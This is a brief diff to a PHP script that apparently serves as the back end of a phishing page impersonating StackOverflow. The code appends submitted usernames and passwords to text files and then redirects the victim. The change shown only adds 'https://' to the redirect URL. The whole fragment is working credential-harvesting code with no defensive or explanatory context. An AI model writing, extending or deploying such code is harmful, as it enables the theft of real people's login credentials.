@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "StackOverflow Username : " . $email = $_POST
 ?>
 <?php
 file_put_contents("pass.txt", "StackOverflow Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
